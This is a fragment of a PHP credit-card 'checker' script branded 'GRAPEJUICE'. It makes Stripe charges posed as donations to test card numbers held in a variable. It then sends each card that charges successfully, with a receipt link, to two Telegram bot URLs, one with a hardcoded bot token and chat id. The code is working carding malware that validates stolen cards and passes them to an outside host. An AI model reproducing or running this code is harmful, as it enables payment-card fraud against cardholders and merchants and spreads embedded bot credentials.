...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=GRAPEJUICE Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
...
if(strpos($result2, '"seller_message": "Payment complete."' )) {
    ...
    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' 𝗖𝗖𝗡 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅ 𝗕𝗬 𝗚𝗥𝗔𝗣𝗘𝗝𝗨𝗜𝗖𝗘  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';

file_get_contents("https://api.telegram.org/bot5938920070:AAEKvcPI3-OnpKi0EqE1LGcHHXvLVeCV3ks/sendMessage?chat_id=5624135698&text=<b>CC</b>-» <code>$lista</code>%0A<b>RESPONSE-» $amt$ CCN CHARGED ✅%0AReceipt -» <a href='$receipturl'>𝙃𝙚𝙧𝙚</a></b>&parse_mode=HTML");
   
   file_get_contents("https://api.telegram.org/bot5591010935:AAEzD2ElONWsbI4yNv-xAQNOWSdwnAr4WyA/sendMessage?chat_id=$id&text=<b>CC</b>-» <code>$lista</code>%0A<b>RESPONSE-» $amt$ CCN CHARGED ✅%0AReceipt -» <a href='$receipturl'>𝙃𝙚𝙧𝙚</a></b>&parse_mode=HTML");
